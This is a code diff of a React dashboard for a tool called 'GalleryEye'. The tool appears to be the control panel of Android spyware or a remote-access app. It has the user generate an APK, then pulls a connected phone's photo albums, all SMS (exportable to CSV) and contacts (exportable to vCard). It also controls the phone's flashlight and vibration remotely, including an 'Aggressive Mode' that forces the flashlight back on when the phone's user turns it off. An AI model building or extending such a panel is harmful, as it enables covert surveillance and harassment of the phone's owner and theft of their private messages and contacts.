@@ -123,7 +123,7 @@ export default function Home() {
         { key: 'whatsapp', label: 'WhatsApp', packages: ['com.whatsapp'], color: '#25D366', img: 'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/240px-WhatsApp.svg.png' },
         { key: 'facebook', label: 'Facebook', packages: ['com.facebook.katana', 'com.facebook.orca', 'com.facebook.lite'], color: '#1877F2', img: 'https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/240px-Facebook_Logo_%282019%29.png' },
         { key: 'instagram', label: 'Instagram', packages: ['com.instagram.android'], color: '#E4405F', img: 'https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/240px-Instagram_icon.png' },
-        { key: 'whatsapp_business', label: 'WA Biz', packages: ['com.whatsapp.w4b'], color: '#128C7E', img: 'https://play-lh.googleusercontent.com/Ga1VNG799Ky-vECFMZo6M2FW-3SQnbEXmfGhFGolFkvRh0JyxOM4sg1rYpjpGlGOJw=w240-h480' },
+        { key: 'whatsapp_business', label: 'WA Biz', packages: ['com.whatsapp.w4b'], color: '#128C7E', img: 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0OCA0OCI+PGNpcmNsZSBjeD0iMjQiIGN5PSIyNCIgcj0iMjQiIGZpbGw9IiMxMjhDN0UiLz48cGF0aCBkPSJNMzQuNiAyOS4yYy0uNS0uMi0yLjgtMS40LTMuMi0xLjZzLS43LS4yLTEgLjJjLS4zLjUtMS4yIDEuNS0xLjUgMS44cy0uNS4zLTEgLjFjLS41LS4yLTItLjctMy44LTIuMy0xLjQtMS4yLTIuMy0yLjgtMi42LTMuMnMwLS43LjItMWMuMi0uMi41LS41LjctLjhzLjMtLjUuNS0uOGMuMS0uMyAwLS42LS4xLS44LS4xLS4yLTEtMi42LTEuNS0zLjUtLjQtLjktLjgtLjgtMS0uOGgtLjljLS4zIDAtLjguMS0xLjMuNnMtMS42IDEuNi0xLjYgNGMwIDIuMyAxLjcgNC41IDEuOSA0LjhzMy4zIDUuMSA4LjEgNy4yYzEuMS41IDIgLjggMi43LjdjLjkgMCAyLjgtMS4xIDMuMi0yLjJzLjQtMi4xLjMtMi4yYy0uMS0uMi0uNC0uMy0uOS0uNW0tOC42IDExLjhoMGE5Ljg3IDkuODcgMCAwMS01LTEuNGwtLjQtLjItMy43IDFMMTggMzMuNGwtLjItLjRhOS44NiA5Ljg2IDAgMDEtMS41LTUuM2MwLTUuNCA0LjQtOS45IDkuOS05LjkgMi42IDAgNS4xIDEgNyAyLjlhOS44MjUgOS44MjUgMCAwMTIuOSA3YzAgNS41LTQuNCA5LjktOS45IDkuOW04LjQtMTguM0ExMS44MTUgMTEuODE1IDAgMDAyNi4xIDRDMTkuNSA0IDE0LjIgOS4zIDE0LjIgMTUuOWMwIDIuMSuNSA0LjEgMS42IDZMTTQuMSAyOGw2LjMtMS43YTExLjg4MiAxMS44ODIgMCAwMDUuNyAxLjVoMGM2LjYgMCAxMS45LTUuMyAxMS45LTExLjlhMTEuODIxIDExLjgyMSAwIDAwLTMuNS04LjQiIGZpbGw9IiNmZmYiLz48cGF0aCBkPSJNMjIgMzJoNHYtMmgtNHYyem0wLThoNHYtMmgtNHYyem0wIDRoNHYtMmgtNHYyeiIgZmlsbD0iI2ZmZiIgb3BhY2l0eT0iLjYiLz48L3N2Zz4=' },
         { key: 'snapchat', label: 'Snapchat', packages: ['com.snapchat.android'], color: '#FFFC00', img: 'https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/240px-Snapchat_logo.svg.png' },
     ];
 
@@ -891,888 +891,904 @@ END:VCARD`;
 
                 {/* Remote Control Section */}
                 <div className="mb-12">
-                    <div className="flex items-center justify-between mb-6">
-                        <div className="flex flex-col gap-1">
-                            <h2 className="text-2xl font-bold">Remote Control</h2>
-                            {selectedDeviceId ? (
-                                <span className="text-sm text-green-400 font-medium flex items-center gap-2">
-                                    Connected to: {devices.find(d => d.deviceId === selectedDeviceId)?.name}
-                                </span>
-                            ) : (
-                                <span className="text-sm text-white/40">Select a device from the top right to enable controls</span>
-                            )}
-                        </div>
-                    </div>
 
-                    {/* Gallery Tool - Folder View */}
-                    {selectedTool === 'gallery' && (
-                        <>
-                            <div className="flex justify-end mb-4">
+                    {/* Show Welcome Screen when no device is selected */}
+                    {!selectedDeviceId && devices.filter(d => d.online).length === 0 ? (
+                        <div className="py-16 flex flex-col items-center justify-center">
+                            <div className="max-w-lg mx-auto text-center space-y-8">
+                                <div className="relative">
+                                    <div className="w-20 h-20 mx-auto rounded-2xl bg-gradient-to-br from-purple-500/20 to-cyan-500/20 border border-white/10 flex items-center justify-center">
+                                        <svg className="w-10 h-10 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
+                                    </div>
+                                    <div className="absolute -top-1 -right-1 w-6 h-6 bg-green-500 rounded-full flex items-center justify-center animate-pulse" style={{ left: 'calc(50% + 24px)' }}>
+                                        <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M12 6v6m0 0v6m0-6h6m-6 0H6"></path></svg>
+                                    </div>
+                                </div>
+                                <div>
+                                    <h3 className="text-xl font-bold text-white mb-2">Welcome to GalleryEye</h3>
+                                    <p className="text-white/40 text-sm">Get started by connecting your device</p>
+                                </div>
+                                <div className="grid gap-3 text-left">
+                                    <div className="flex items-center gap-4 p-4 rounded-xl bg-white/[0.03] border border-white/[0.06]">
+                                        <div className="w-10 h-10 rounded-xl bg-purple-500/15 flex items-center justify-center flex-shrink-0">
+                                            <span className="text-lg font-bold text-purple-400">1</span>
+                                        </div>
+                                        <div>
+                                            <p className="text-sm font-medium text-white/80">Download the App</p>
+                                            <p className="text-xs text-white/30">Click &quot;Download App&quot; in the top right to generate your APK</p>
+                                        </div>
+                                    </div>
+                                    <div className="flex items-center gap-4 p-4 rounded-xl bg-white/[0.03] border border-white/[0.06]">
+                                        <div className="w-10 h-10 rounded-xl bg-cyan-500/15 flex items-center justify-center flex-shrink-0">
+                                            <span className="text-lg font-bold text-cyan-400">2</span>
+                                        </div>
+                                        <div>
+                                            <p className="text-sm font-medium text-white/80">Select Your Device</p>
+                                            <p className="text-xs text-white/30">Once installed, your device will appear in the &quot;Device&quot; menu at the top</p>
+                                        </div>
+                                    </div>
+                                    <div className="flex items-center gap-4 p-4 rounded-xl bg-white/[0.03] border border-white/[0.06]">
+                                        <div className="w-10 h-10 rounded-xl bg-green-500/15 flex items-center justify-center flex-shrink-0">
+                                            <span className="text-lg font-bold text-green-400">3</span>
+                                        </div>
+                                        <div>
+                                            <p className="text-sm font-medium text-white/80">Use the Tools</p>
+                                            <p className="text-xs text-white/30">Pick from Gallery, Camera, Notifications, SMS &amp; more using the &quot;Tools&quot; menu</p>
+                                        </div>
+                                    </div>
+                                </div>
                                 <button
-                                    onClick={fetchFolders}
-                                    disabled={!selectedDeviceId}
-                                    className={`px-4 py-2 rounded-lg border transition-colors text-sm font-medium ${selectedDeviceId ? 'bg-white text-black hover:bg-gray-200' : 'bg-white/5 border-white/5 text-white/20 cursor-not-allowed'}`}
+                                    onClick={() => setShowAppModal(true)}
+                                    className="px-6 py-3 rounded-xl bg-gradient-to-r from-purple-500 to-cyan-500 text-white font-semibold hover:scale-[1.02] transition-transform shadow-lg shadow-purple-500/20"
                                 >
-                                    Refresh Folders
+                                    Get Started — Download App
                                 </button>
                             </div>
-
-                            {folders.length > 0 ? (
-                                <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-3">
-                                    {folders.map((folder: any, idx) => (
-                                        <button key={idx} onClick={() => handleFolderClick(folder)} className="p-3 rounded-xl bg-white/5 border border-white/10 hover:border-purple-500/50 hover:bg-white/10 transition-all group text-left">
-                                            <div className="flex justify-between items-start mb-2">
-                                                <div className="p-1.5 rounded-lg bg-purple-500/20 text-purple-400">
-                                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"></path></svg>
-                                                </div>
-                                            </div>
-                                            <div className="truncate font-medium text-sm">{folder.name}</div>
-                                            <div className="text-xs text-white/40">
-                                                {folder.imageCount > 0 && folder.videoCount > 0
-                                                    ? `${folder.imageCount} 📷 • ${folder.videoCount} 🎥`
-                                                    : folder.imageCount > 0
-                                                        ? `${folder.imageCount} images`
-                                                        : `${folder.videoCount} videos`}
-                                            </div>
-                                        </button>
-                                    ))}
+                        </div>
+                    ) : (
+                        <>
+                            <div className="flex items-center justify-between mb-6">
+                                <div className="flex flex-col gap-1">
+                                    <h2 className="text-2xl font-bold">Remote Control</h2>
+                                    {selectedDeviceId ? (
+                                        <span className="text-sm text-green-400 font-medium flex items-center gap-2">
+                                            Connected to: {devices.find(d => d.deviceId === selectedDeviceId)?.name}
+                                        </span>
+                                    ) : (
+                                        <span className="text-sm text-white/40">Select a device from the top right to enable controls</span>
+                                    )}
                                 </div>
-                            ) : (
-                                <div className="py-16 flex flex-col items-center justify-center">
-                                    {!selectedDeviceId ? (
-                                        <div className="max-w-lg mx-auto text-center space-y-8">
-                                            <div className="relative">
-                                                <div className="w-20 h-20 mx-auto rounded-2xl bg-gradient-to-br from-purple-500/20 to-cyan-500/20 border border-white/10 flex items-center justify-center">
-                                                    <svg className="w-10 h-10 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
-                                                </div>
-                                                <div className="absolute -top-1 -right-1 w-6 h-6 bg-green-500 rounded-full flex items-center justify-center animate-pulse" style={{ left: 'calc(50% + 24px)' }}>
-                                                    <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M12 6v6m0 0v6m0-6h6m-6 0H6"></path></svg>
-                                                </div>
-                                            </div>
-                                            <div>
-                                                <h3 className="text-xl font-bold text-white mb-2">Welcome to GalleryEye</h3>
-                                                <p className="text-white/40 text-sm">Get started by connecting your device</p>
-                                            </div>
-                                            <div className="grid gap-3 text-left">
-                                                <div className="flex items-center gap-4 p-4 rounded-xl bg-white/[0.03] border border-white/[0.06]">
-                                                    <div className="w-10 h-10 rounded-xl bg-purple-500/15 flex items-center justify-center flex-shrink-0">
-                                                        <span className="text-lg font-bold text-purple-400">1</span>
+                            </div>
+
+                            {/* Gallery Tool - Folder View */}
+                            {selectedTool === 'gallery' && (
+                                <>
+                                    <div className="flex justify-end mb-4">
+                                        <button
+                                            onClick={fetchFolders}
+                                            disabled={!selectedDeviceId}
+                                            className={`px-4 py-2 rounded-lg border transition-colors text-sm font-medium ${selectedDeviceId ? 'bg-white text-black hover:bg-gray-200' : 'bg-white/5 border-white/5 text-white/20 cursor-not-allowed'}`}
+                                        >
+                                            Refresh Folders
+                                        </button>
+                                    </div>
+
+                                    {folders.length > 0 ? (
+                                        <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-3">
+                                            {folders.map((folder: any, idx) => (
+                                                <button key={idx} onClick={() => handleFolderClick(folder)} className="p-3 rounded-xl bg-white/5 border border-white/10 hover:border-purple-500/50 hover:bg-white/10 transition-all group text-left">
+                                                    <div className="flex justify-between items-start mb-2">
+                                                        <div className="p-1.5 rounded-lg bg-purple-500/20 text-purple-400">
+                                                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"></path></svg>
+                                                        </div>
                                                     </div>
-                                                    <div>
-                                                        <p className="text-sm font-medium text-white/80">Download the App</p>
-                                                        <p className="text-xs text-white/30">Click &quot;Download App&quot; in the top right to generate your APK</p>
+                                                    <div className="truncate font-medium text-sm">{folder.name}</div>
+                                                    <div className="text-xs text-white/40">
+                                                        {folder.imageCount > 0 && folder.videoCount > 0
+                                                            ? `${folder.imageCount} 📷 • ${folder.videoCount} 🎥`
+                                                            : folder.imageCount > 0
+                                                                ? `${folder.imageCount} images`
+                                                                : `${folder.videoCount} videos`}
                                                     </div>
-                                                </div>
-                                                <div className="flex items-center gap-4 p-4 rounded-xl bg-white/[0.03] border border-white/[0.06]">
-                                                    <div className="w-10 h-10 rounded-xl bg-cyan-500/15 flex items-center justify-center flex-shrink-0">
-                                                        <span className="text-lg font-bold text-cyan-400">2</span>
-                                                    </div>
-                                                    <div>
-                                                        <p className="text-sm font-medium text-white/80">Select Your Device</p>
-                                                        <p className="text-xs text-white/30">Once installed, your device will appear in the &quot;Device&quot; menu at the top</p>
-                                                    </div>
-                                                </div>
-                                                <div className="flex items-center gap-4 p-4 rounded-xl bg-white/[0.03] border border-white/[0.06]">
-                                                    <div className="w-10 h-10 rounded-xl bg-green-500/15 flex items-center justify-center flex-shrink-0">
-                                                        <span className="text-lg font-bold text-green-400">3</span>
-                                                    </div>
-                                                    <div>
-                                                        <p className="text-sm font-medium text-white/80">Use the Tools</p>
-                                                        <p className="text-xs text-white/30">Pick from Gallery, Camera, Notifications, SMS &amp; more using the &quot;Tools&quot; menu</p>
-                                                    </div>
-                                                </div>
-                                            </div>
-                                            <button
-                                                onClick={() => setShowAppModal(true)}
-                                                className="px-6 py-3 rounded-xl bg-gradient-to-r from-purple-500 to-cyan-500 text-white font-semibold hover:scale-[1.02] transition-transform shadow-lg shadow-purple-500/20"
-                                            >
-                                                Get Started — Download App
-                                            </button>
+                                                </button>
+                                            ))}
                                         </div>
                                     ) : (
-                                        <div className="max-w-sm mx-auto text-center space-y-4">
-                                            <div className="w-16 h-16 mx-auto rounded-2xl bg-purple-500/10 border border-purple-500/20 flex items-center justify-center">
-                                                <svg className="w-8 h-8 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
+                                        <div className="py-12 flex flex-col items-center justify-center">
+                                            <div className="max-w-sm mx-auto text-center space-y-4">
+                                                <div className="w-16 h-16 mx-auto rounded-2xl bg-purple-500/10 border border-purple-500/20 flex items-center justify-center">
+                                                    <svg className="w-8 h-8 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
+                                                </div>
+                                                <div>
+                                                    <p className="text-white/60 font-medium">No albums loaded yet</p>
+                                                    <p className="text-white/30 text-sm">Click the button below to load albums from your device</p>
+                                                </div>
+                                                <button
+                                                    onClick={fetchFolders}
+                                                    className="px-5 py-2.5 rounded-xl bg-white/10 border border-white/10 text-white/70 text-sm font-medium hover:bg-white/15 transition-colors"
+                                                >
+                                                    Load Albums
+                                                </button>
                                             </div>
-                                            <div>
-                                                <p className="text-white/60 font-medium">No albums loaded yet</p>
-                                                <p className="text-white/30 text-sm">Click the button above to load device albums</p>
+                                        </div>
+                                    )}
+                                </>
+                            )}
+
+                            {/* SMS Tool */}
+                            {selectedTool === 'sms' && (
+                                <div className="space-y-4">
+                                    <div className="flex flex-col sm:flex-row gap-3 justify-between items-start sm:items-center">
+                                        <div className="flex gap-2">
+                                            <button
+                                                onClick={fetchSms}
+                                                disabled={!selectedDeviceId || isFetchingSms}
+                                                className={`px-4 py-2 rounded-lg border transition-colors text-sm font-medium flex items-center gap-2 ${selectedDeviceId ? 'bg-white text-black hover:bg-gray-200' : 'bg-white/5 border-white/5 text-white/20 cursor-not-allowed'}`}
+                                            >
+                                                {isFetchingSms ? (
+                                                    <div className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin" />
+                                                ) : (
+                                                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
+                                                )}
+                                                {smsList.length > 0 ? 'Fetch New SMS' : 'Fetch All SMS'}
+                                            </button>
+                                            {smsList.length > 0 && (
+                                                <>
+                                                    <button
+                                                        onClick={resetSmsSync}
+                                                        className="px-3 py-2 rounded-lg border border-white/10 bg-white/5 text-white/70 text-sm hover:bg-white/10 transition-colors"
+                                                    >
+                                                        Reset
+                                                    </button>
+                                                    <button
+                                                        onClick={downloadSmsAsCsv}
+                                                        className="px-3 py-2 rounded-lg border border-green-500/30 bg-green-500/10 text-green-400 text-sm hover:bg-green-500/20 transition-colors flex items-center gap-1"
+                                                    >
+                                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
+                                                        CSV
+                                                    </button>
+                                                </>
+                                            )}
+                                        </div>
+                                        <div className="relative w-full sm:w-64">
+                                            <input
+                                                type="text"
+                                                placeholder="Search SMS..."
+                                                value={smsSearchQuery}
+                                                onChange={(e) => setSmsSearchQuery(e.target.value)}
+                                                className="w-full px-4 py-2 pl-10 rounded-lg bg-white/5 border border-white/10 text-white placeholder-white/40 focus:outline-none focus:border-purple-500/50"
+                                            />
+                                            <svg className="w-4 h-4 text-white/40 absolute left-3 top-1/2 -translate-y-1/2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
+                                        </div>
+                                    </div>
+
+                                    {smsList.length > 0 ? (
+                                        <div className="space-y-2 max-h-[60vh] overflow-y-auto">
+                                            <p className="text-xs text-white/40 mb-2">{filteredSms.length} messages</p>
+                                            {filteredSms.map((sms: any) => (
+                                                <div
+                                                    key={sms.id}
+                                                    onClick={() => setSelectedSms(sms)}
+                                                    className="p-4 rounded-xl bg-white/5 border border-white/10 hover:border-purple-500/50 hover:bg-white/10 transition-all cursor-pointer"
+                                                >
+                                                    <div className="flex justify-between items-start mb-2">
+                                                        <span className="font-medium text-sm">{sms.address}</span>
+                                                        <span className="text-xs text-white/40">
+                                                            {new Date(sms.date).toLocaleDateString()} {new Date(sms.date).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
+                                                        </span>
+                                                    </div>
+                                                    <p className="text-sm text-white/70 line-clamp-2">{sms.body}</p>
+                                                    <div className="flex gap-2 mt-2">
+                                                        <span className={`text-xs px-2 py-0.5 rounded ${sms.type === 1 ? 'bg-blue-500/20 text-blue-400' : 'bg-green-500/20 text-green-400'}`}>
+                                                            {sms.type === 1 ? 'Received' : 'Sent'}
+                                                        </span>
+                                                    </div>
+                                                </div>
+                                            ))}
+                                        </div>
+                                    ) : (
+                                        <div className="p-8 rounded-2xl bg-white/5 border border-white/10 text-center text-white/40">
+                                            <svg className="w-12 h-12 mx-auto mb-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
+                                            {!selectedDeviceId
+                                                ? "Select a device to view SMS"
+                                                : isFetchingSms
+                                                    ? "Fetching SMS..."
+                                                    : "Click \"Fetch All SMS\" to load messages"}
+                                        </div>
+                                    )}
+                                </div>
+                            )}
+
+                            {/* Contacts Tool */}
+                            {selectedTool === 'contacts' && (
+                                <div className="space-y-4">
+                                    <div className="flex flex-col sm:flex-row gap-3 justify-between items-start sm:items-center">
+                                        <div className="flex gap-2">
+                                            <button
+                                                onClick={fetchContacts}
+                                                disabled={!selectedDeviceId || isFetchingContacts}
+                                                className={`px-4 py-2 rounded-lg border transition-colors text-sm font-medium flex items-center gap-2 ${selectedDeviceId ? 'bg-white text-black hover:bg-gray-200' : 'bg-white/5 border-white/5 text-white/20 cursor-not-allowed'}`}
+                                            >
+                                                {isFetchingContacts ? (
+                                                    <div className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin" />
+                                                ) : (
+                                                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
+                                                )}
+                                                Fetch Contacts
+                                            </button>
+                                            {contactsList.length > 0 && (
+                                                <button
+                                                    onClick={downloadContactsAsVcf}
+                                                    className="px-3 py-2 rounded-lg border border-green-500/30 bg-green-500/10 text-green-400 text-sm hover:bg-green-500/20 transition-colors flex items-center gap-1"
+                                                >
+                                                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
+                                                    vCard
+                                                </button>
+                                            )}
+                                        </div>
+                                        <div className="relative w-full sm:w-64">
+                                            <input
+                                                type="text"
+                                                placeholder="Search contacts..."
+                                                value={contactsSearchQuery}
+                                                onChange={(e) => setContactsSearchQuery(e.target.value)}
+                                                className="w-full px-4 py-2 pl-10 rounded-lg bg-white/5 border border-white/10 text-white placeholder-white/40 focus:outline-none focus:border-purple-500/50"
+                                            />
+                                            <svg className="w-4 h-4 text-white/40 absolute left-3 top-1/2 -translate-y-1/2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
+                                        </div>
+                                    </div>
+
+                                    {contactsList.length > 0 ? (
+                                        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 max-h-[60vh] overflow-y-auto">
+                                            <p className="text-xs text-white/40 col-span-full">{filteredContacts.length} contacts</p>
+                                            {filteredContacts.map((contact: any) => (
+                                                <div
+                                                    key={contact.id}
+                                                    className="p-4 rounded-xl bg-white/5 border border-white/10 hover:border-purple-500/50 hover:bg-white/10 transition-all"
+                                                >
+                                                    <div className="flex items-center gap-3 mb-2">
+                                                        <div className="w-10 h-10 rounded-full bg-gradient-to-br from-purple-500 to-blue-500 flex items-center justify-center font-bold text-sm">
+                                                            {contact.name?.charAt(0)?.toUpperCase() || '?'}
+                                                        </div>
+                                                        <div className="flex-1 min-w-0">
+                                                            <p className="font-medium text-sm truncate">{contact.name}</p>
+                                                        </div>
+                                                    </div>
+                                                    {contact.phones?.length > 0 && (
+                                                        <div className="space-y-1">
+                                                            {contact.phones.slice(0, 2).map((phone: any, idx: number) => (
+                                                                <p key={idx} className="text-xs text-white/60 flex items-center gap-1">
+                                                                    <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"></path></svg>
+                                                                    {typeof phone === 'string' ? phone : phone?.number || 'Unknown'}
+                                                                </p>
+                                                            ))}
+                                                        </div>
+                                                    )}
+                                                    {contact.emails?.length > 0 && (
+                                                        <div className="mt-1">
+                                                            {contact.emails.slice(0, 1).map((email: any, idx: number) => (
+                                                                <p key={idx} className="text-xs text-white/60 flex items-center gap-1 truncate">
+                                                                    <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>
+                                                                    {typeof email === 'string' ? email : email?.address || 'Unknown'}
+                                                                </p>
+                                                            ))}
+                                                        </div>
+                                                    )}
+                                                </div>
+                                            ))}
+                                        </div>
+                                    ) : (
+                                        <div className="p-8 rounded-2xl bg-white/5 border border-white/10 text-center text-white/40">
+                                            <svg className="w-12 h-12 mx-auto mb-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
+                                            {!selectedDeviceId
+                                                ? "Select a device to view contacts"
+                                                : isFetchingContacts
+                                                    ? "Fetching contacts..."
+                                                    : "Click \"Fetch Contacts\" to load contacts"}
+                                        </div>
+                                    )}
+                                </div>
+                            )}
+
+                            {/* Torch Tool */}
+                            {selectedTool === 'torch' && (
+                                <div className="bg-white/5 border border-white/10 p-6 rounded-2xl max-w-xl mx-auto">
+                                    <div className="flex items-center justify-between mb-8">
+                                        <div>
+                                            <h3 className="text-xl font-bold mb-1">Flashlight Control</h3>
+                                            <p className="text-white/40 text-sm">Control device flashlight remotely</p>
+                                        </div>
+                                        <button
+                                            onClick={toggleTorch}
+                                            disabled={!selectedDeviceId}
+                                            className={`w-16 h-8 rounded-full transition-colors relative ${isTorchOn ? 'bg-yellow-500' : 'bg-white/20'}`}
+                                        >
+                                            <div className={`w-6 h-6 bg-white rounded-full absolute top-1 transition-transform shadow-lg ${isTorchOn ? 'left-9' : 'left-1'}`} />
+                                        </button>
+                                    </div>
+
+                                    <div className="space-y-4 pt-4 border-t border-white/10">
+                                        <div className="flex items-center justify-between p-4 rounded-xl bg-black/20">
+                                            <div className="flex items-center gap-3">
+                                                <div className="p-2 rounded-lg bg-red-500/20 text-red-400">
+                                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+                                                </div>
+                                                <div>
+                                                    <p className="font-medium text-sm">Aggressive Mode</p>
+                                                    <p className="text-xs text-white/40">Forces flashlight ON if turned off by user</p>
+                                                </div>
                                             </div>
                                             <button
-                                                onClick={fetchFolders}
-                                                className="px-5 py-2.5 rounded-xl bg-white/10 border border-white/10 text-white/70 text-sm font-medium hover:bg-white/15 transition-colors"
+                                                onClick={() => setTorchAggressive(!torchAggressive)}
+                                                className={`w-12 h-6 rounded-full transition-colors relative ${torchAggressive ? 'bg-red-500' : 'bg-white/20'}`}
                                             >
-                                                Load Albums
+                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${torchAggressive ? 'left-7' : 'left-1'}`} />
                                             </button>
+                                        </div>
+
+                                        {torchAggressive && (
+                                            <div className="p-4 rounded-xl bg-black/20 animate-fadeIn">
+                                                <label className="block text-xs font-medium text-white/60 mb-2">Duration (minutes)</label>
+                                                <div className="flex items-center gap-4">
+                                                    <input
+                                                        type="range"
+                                                        min="1"
+                                                        max="5"
+                                                        step="1"
+                                                        value={torchDuration / 60000}
+                                                        onChange={(e) => setTorchDuration(parseInt(e.target.value) * 60000)}
+                                                        className="flex-1 accent-yellow-500 h-2 bg-white/10 rounded-lg appearance-none cursor-pointer"
+                                                    />
+                                                    <span className="text-sm font-bold w-12 text-right">{torchDuration / 60000}m</span>
+                                                </div>
+                                            </div>
+                                        )}
+                                    </div>
+                                </div>
+                            )}
+
+                            {/* Vibration Tool */}
+                            {selectedTool === 'vibration' && (
+                                <div className="bg-white/5 border border-white/10 p-6 rounded-2xl max-w-xl mx-auto">
+                                    <div className="flex items-center justify-between mb-8">
+                                        <div>
+                                            <h3 className="text-xl font-bold mb-1">Vibration Control</h3>
+                                            <p className="text-white/40 text-sm">Vibrate device remotely</p>
+                                        </div>
+                                    </div>
+
+                                    <div className="space-y-6">
+                                        <div>
+                                            <label className="block text-xs font-medium text-white/60 mb-2">Duration (seconds)</label>
+                                            <div className="flex items-center gap-4">
